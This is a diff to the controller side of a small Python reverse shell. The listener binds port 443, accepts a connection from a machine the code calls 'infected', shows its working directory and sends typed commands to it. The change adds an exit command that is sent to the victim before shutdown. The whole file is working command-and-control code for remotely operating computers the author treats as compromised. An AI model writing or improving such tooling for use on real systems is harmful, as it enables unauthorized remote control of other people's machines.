@@ -1,4 +1,5 @@
 import socket
+import sys
 
 #run this side on the controller computer
 
@@ -8,6 +9,7 @@ Port = 443       #HTTP Port
 Size = 1024 * 128  #Size of message
 
 message = "Thank You for Connecting!"
+exit_command = 'exit'
 
 s = socket.socket()  #Creating a socket 
 s.bind((Host,Port))  #binds the host IP to port 
@@ -23,11 +25,12 @@ pwd = infected.recv(Size).decode()#Decodes the message from Infector. Should be 
 print("Current working directory: ",pwd) #prints the initial directory you are starting in 
 
 while True:
-
     command = input(f"{pwd} $> ") #prints out a working directory in command like structure
 
     if 'exit' in command :
         s.close()                       #will close and stop host server. 
+        infected.send(exit_command.encode())
+        sys.exit()
 
     elif command[:2] == 'cd':           
         infected.send(command.encode())
